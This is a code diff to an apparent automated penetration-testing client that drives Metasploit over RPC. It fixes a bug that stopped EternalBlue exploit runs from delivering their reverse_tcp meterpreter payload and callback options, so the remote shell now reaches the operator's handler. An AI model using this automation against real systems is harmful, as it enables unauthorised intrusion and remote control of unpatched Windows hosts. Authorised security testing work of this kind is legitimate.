@@ -909,6 +909,43 @@ class MetasploitClient:
                 if mtype == "exploit" and "DisablePayloadHandler" in module.options:
                     module["DisablePayloadHandler"] = True
 
+            # CRITICAL BUG FIX (EternalBlue "shell never lands" root cause):
+            # pymetasploit3's execute() (msfrpc.py ~L1425) has this branch:
+            #
+            #   if 'DisablePayloadHandler' in runopts and runopts['DisablePayloadHandler']:
+            #       pass                         # <-- skips payload entirely
+            #   elif payload is None:
+            #       runopts['DisablePayloadHandler'] = True
+            #   else:
+            #       runopts['PAYLOAD'] = payload.modulename
+            #       for k, v in payload.runoptions.items(): ...
+            #
+            # When DisablePayloadHandler=True is already set (our line above),
+            # execute() hits `pass` and NEVER copies PAYLOAD/LHOST/LPORT from
+            # the PayloadModule into the RPC call.  MSF receives the exploit
+            # with no payload and falls back to the module's DEFAULT payload
+            # (e.g. windows/x64/meterpreter/reverse_tcp for eternalblue) with
+            # default/empty callback addresses.  The target injects the wrong
+            # shellcode calling back to nowhere; our handler sits on LHOST:LPORT
+            # waiting for a callback that never matches.  This is exactly why
+            # msfconsole (where you `set PAYLOAD/LHOST/LPORT` explicitly) works
+            # every time but the framework's start_handler=True path never lands.
+            #
+            # Fix: inject PAYLOAD + LHOST + LPORT (+ any other payload-level
+            # options) directly into the exploit module's _runopts BEFORE
+            # calling execute().  execute() copies _runopts verbatim into the
+            # RPC call (runopts = self.runoptions.copy()), so the payload
+            # options reach MSF even though the `pass` branch skips the
+            # PayloadModule merge.  We write to _runopts directly because
+            # __setitem__ rejects PAYLOAD/LHOST/LPORT as invalid exploit-module
+            # option keys (they're payload-level, not exploit-level options).
+            if mtype == "exploit" and payload_arg is not None:
+                module._runopts["PAYLOAD"] = payload_arg.modulename
+                for _pk, _pv in payload_arg.runoptions.items():
+                    if _pv is None or (isinstance(_pv, str) and not _pv):
+                        continue
+                    module._runopts[_pk] = _pv
+
             # Execute the module (fires as a job, returns immediately).
             # For exploit modules with a payload, the handler is enabled and
             # LHOST/LPORT are properly set.  For auxiliaries, payload_arg is
